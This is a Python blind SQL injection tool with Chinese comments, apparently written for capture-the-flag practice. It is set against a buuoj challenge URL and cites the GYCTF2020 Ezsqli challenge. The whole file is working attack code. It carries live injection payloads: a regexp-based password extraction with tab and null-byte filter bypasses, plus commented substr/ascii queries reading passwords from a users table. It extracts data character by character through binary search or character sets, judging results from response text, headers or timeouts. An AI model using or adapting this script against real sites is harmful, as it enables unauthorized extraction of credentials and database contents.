from email import header
from operator import mod
from flask import redirect
import requests as res
import string
import traceback
import time

#=====半自动盲注脚本=====
#       函数介绍
#main=>没啥用,就是把一些变量设置成全局变量
#binarySearch=>二分法的盲注主体,用来自动生成接下来需要测试的字符等信息
#characterSet=>字符集的盲注主体,用来自动生成接下来需要测试的字符等信息
#req=>用来构造请求,主要的payload就是在这里调试
#check=>根据req提供处理后的响应信息来判断盲注是否成功
#       执行流程
#
#                |             <-         ^
#                V                        |
#          
#   main     XXXsearch         ->        req  ->  check   -> 总的盲注数据(因为测字段长度感觉没必要,所以每匹配成功就会输出一次新数据)
#        
#                ^                        |
#                |             <-         V
#

url=""
reqMethod=""
checkMethod=""
keyString=""
headerKey=""
headerValue=""
redirects=True
length=0
sleep=0
def main(theUrl,method,theReqMethod="get",theCheckMethod="textA",theKeyString="",setNum=1,theLength=32,theSleep=0.3,theHeaderKey="",theHeaderValue="",redirect=True):
    global url,reqMethod,checkMethod,keyString,length,sleep,headerKey,headerValue,redirects
    url=theUrl
    reqMethod=theReqMethod
    checkMethod=theCheckMethod
    keyString=theKeyString
    length=theLength
    sleep=theSleep
    headerKey=theHeaderKey
    headerValue=theHeaderValue
    redirects=redirect
    if(method=="bs"):
        binarySearch()
    elif(method[:2]=="cs"):
        model=method[2:]
        if(model=="A" or model=="B"):
            characterSet(setNum,model=model)
        else:
            print("[+]Invalid cs method")
            exit()
    elif(method=="nc"):
        NoColumns(setNum)
    else:
        print("[+]Invalid method")
        exit()

def binarySearch(thePrv=32,theLast=126):
    #thePrv是二分法的最小值 
    #theLast是二分法的最大值
    #这里提供了两种方法,其中第1种包含符号>=,第2种只包含>,采用如下的model变量选择
    #注意两种方式while循环条件和prv值并不相同
    model=1
    result=""
    endFlag=False
    for num in range(1,length):
        if endFlag:
            print("[+]Match Finished!")
            break
        prv=thePrv
        last=theLast
        middle=(prv+last)//2
        if model==1:
            while(prv<=last):
                print("[+]Testing:{}=>{}".format(num,middle))
                if(req(code=middle,num=num,sympol="=")):
                    result+=chr(middle)
                    print("[+]Matched!Now result:{}".format(result))
                    break
                elif(req(code=middle,num=num,sympol=">")):
                    prv=middle+1
                else:
                    if(middle==32):
                        endFlag=True
                        break
                    last=middle-1
                middle=(prv+last)//2
        elif model==2:
            last+=1
            while(prv<last):
                print("[+]Testing:{}=>{}".format(num,middle))
                if(req(code=middle,num=num,sympol=">")):
                    prv=middle+1
                else:
                    last=middle
                middle=(prv+last)//2
            if middle==32 and not req(code=0,num=num,sympol=">"):
                endFlag=True
                break
            result+=chr(middle)
            print("[+]Matched!Now result:{}".format(result))
    print("[+]The full result:{}".format(result))

def characterSet(setNum=1,model="A"):
    #setNum为将使用的字符集
    #字母集存储在getCharacterSet函数中
    targetCharSet=getCharacterSet(setNum)
    result=""
    endFlag=False
    for num in range(1,length):
        if endFlag:
            print("[+]Match Finished!")
            break
        for char in targetCharSet:
            print("[+]Testing:{}=>{}".format(num,char))
            if model=="A":
                checkFlag=req(char=char,num=num)
            elif model=="B":
                checkFlag=req(char=result+char)
            if checkFlag:
                result+=char
                print("[+]Matched!Now result:{}".format(result))
                break
            elif char==targetCharSet[len(targetCharSet)-1:]:
                endFlag=True
                break
    print("[+]The full result:{}".format(result))


def NoColumns(setNum):
    #用nc前需要把除了测试字段外其余字段值整出来
    #目前依据[GYCTF2020]Ezsqli构造的这个方法
    #sympol用小于号也行没啥区别
    targetCharSet=getCharacterSet(setNum)
    result=""
    sympol=">"
    endFlag=False
    for num in range(1,length):
        if endFlag:
            print("[+]Match Finished!")
            break
        for char in targetCharSet:
            print("[+]Testing:{}=>{}".format(num,char))
            checkMin=req(char=result+char+"!",sympol=sympol)
            checkMax=req(char=result+char+"~",sympol=sympol)
            checkEqual=req(char=result+char,num=num,sympol="=")
            checkFlag=checkMax^checkMin
            print("[+]min:{} ^ max:{} => flag:{}".format(checkMin,checkMax,checkFlag))
            if checkFlag or checkEqual:
                result+=char
                print("[+]Matched!Now result:{}".format(result))
                print("[+]equal:{}".format(checkEqual))
                if checkEqual:
                    endFlag=True
                break
            elif char==targetCharSet[len(targetCharSet)-1:]:
                endFlag=True
                break
    print("[+]The full result:{}".format(result))

def getCharacterSet(num):
    charSet={
        1:string.ascii_letters+string.digits,     #大小写26字母+数字
        2:string.digits+"abcdef"+"{}-",     #flag字符
        3:"!#$%&()*+,-./:;<=>?@[\]^_`{|}~",       #除开单双引号的标点字符
        4:string.ascii_letters+string.digits+"!#$%&()*+,-./:;<=>?@[\]^_`{|}~",   #所有除开单双引号可见字符
        5:string.ascii_lowercase+"0123456789"+"{}_@%,.<>=-",    #感觉可能用的最多的
        6:string.ascii_lowercase+"0123456789"+"_-"   #5的简化版本
    }
    return charSet[num]

def req(num=0,char="",sympol="",code=0):
    #num为当前字段的第几位,csA和bs均提供
    #char为猜测的字符,csX和nc提供
    #   nc提供的char携带额外1位(共两位)字符辅助判断
    #   csA提供单独猜测字符,csB提供包含已测出字符串的结果字符串
    #code为猜测的字符的ascii值,仅bs提供
    #sympol为二分使用的判断符号,bs和nc提供
    #综上
    # bs : num code sympol
    # csA : num char
    # csB : char
    # nc : char sympol
    timeOutFlag=False
    httpReq=False
    if(checkMethod[:4]=="time"):
        timeOut=float(checkMethod[4:])
    else:
        timeOut=5
    try:
        #在这里添加header和cookie信息
        header={

        }
        cookie={

        }
        if(reqMethod=="get"):
            #在这里构造get数据
            params={
                #"id":"\\0",
                #"path":'or substr((select password from users),{},1)={}#'.format(num,str(hex(ord(char))))
                #"path":"or ascii(substr((select password from users),{},1)){}{}#".format(num,sympol,code)

            }
            httpReq=getattr(res,reqMethod)(url=url,params=params,headers=header,cookies=cookie,timeout=timeOut,allow_redirects=redirects)
        elif(reqMethod=="post"):
            #在这里构造post数据
            data={
                "username":"\\",
                "passwd":'||\x09passwd\x09regexp\x09"^{}";\x00'.format(char)
            }
            httpReq=getattr(res,reqMethod)(url=url,data=data,headers=header,cookies=cookie,timeout=timeOut,allow_redirects=redirects)
        else:
            print("[+]Invalid reqMethod")
            exit()
    except res.exceptions.RequestException:
        timeOutFlag=True
    except (Exception, BaseException) as e:
        print("[+]请求发生错误:{}".format(e))
    finally:
        #防止429,以后再细化处理下429的问题
        time.sleep(sleep)
        if(checkMethod[:4]=="text"):
            return check(httpReq=httpReq)
        elif(checkMethod[:4]=="time"):
            return check(timeFlag=timeOutFlag)         

def check(httpReq=False,timeFlag=False):
    #text为返回包body部分数据(经过了包的自动编码)
    #timeFlag为判断依据为超时时的判断结果
    if httpReq==False:
        print("[+]错误:HTTP未请求!请检查req函数!")
        print("=======TraceBack=======")
        print(traceback.format_exc())
        print("=======================")
        exit()
    if(checkMethod[:4]=="text"):
        text=httpReq.text
        headers=httpReq.headers
        if(checkMethod[4:]=="A"):
            print("[+]Lenght of text:{}".format(len(text)))
            if(text.find(keyString)!=-1):
                return True
            else:
                return False
        elif(checkMethod[4:]=="B"):
            print("[+]Lenght of text:{}".format(len(text)))
            if(text!=''):
                return True
            else:
                return False
        elif(checkMethod[4:]=="C"):
            print("[+]The header:{}".format(headers.get(headerKey)))
            if(headers.get(headerKey)!=None):
                if(headers.get(headerKey).find(headerValue)!=-1):
                    return True
                else:
                    return False
            else:
                return False
    elif(checkMethod[:4]=="time"):
        return timeFlag
    elif(checkMethod[:4]=="else"):
        pass
        #目前没啥用以后想到了再添加
    else:
        print("[+]Invalid checkMethod")
        exit()

if __name__ == '__main__' :
    #用前须知
    #[1]main配置参数
    #[2]req构造具体payload
    #[3]对check配置(可能需要)
    '''
    url             具体提交数据的页面的URL
    method          盲注的方法,有bs代表的二分法、csX代表的字符集、nc代表的无列名三种
                    其中csX分为,csA为不积累成功匹配参与下次匹配,csB为积累成功匹配参与下次匹配
    theCheckMethod  检查方式textX和timeX两种(前4字母代表主方式,最后X代表次方式)
                    对于textX:X可以为A代表关键字B代表检测图片C代表返回行
                    对于timeX:X为纯数字代表超时时间(可以写小数)
                    默认为textA(添了个没写的else)
    setNum          csX、nc方式采用的字数集序号,默认为1
    theReqMethod    请求方式,get和post两种,默认为GET
    theKeyString    用来判断的关键字,默认为空需要自己传入,textA模式使用
    theLength       设置匹配字段的最大长度,默认为32
    sleep           每次请求后的睡眠时间,防止429,默认0.3秒
    theHeaderKey    用来判断的返回行,默认为空需要自己传入,textC模式使用
    theHeaderValue  用来判断的返回行的值,默认为空需要自己传入,textC模式使用
    redirek         设置是否自动跟随页面,比如有Loaction就会自动跟过去
    '''
    url="http://8d7db3a5-3d71-4eb0-98b9-37bfbb0e995e.node4.buuoj.cn:81/index.php"
    method="csB"
    theCheckMethod="textC"
    length=50
    theReqMethod="post"
    theHeaderKey="Location"
    theHeaderValue="welcome.php"
    setNum=6
    sleep=0.5
    redirek=False
    main(theUrl=url,method=method,theCheckMethod=theCheckMethod,theLength=length,theReqMethod=theReqMethod,theHeaderKey=theHeaderKey,theHeaderValue=theHeaderValue,setNum=setNum,theSleep=sleep,redirect=redirek)
    #setNum=0
    #theReqMethod=''
    #theKeyString=""
    #main(theUrl=url,method=method,setNum=setNum,theCheckMethod=theCheckMethod,theReqMethod=theReqMethod,theKeyString=theKeyString)
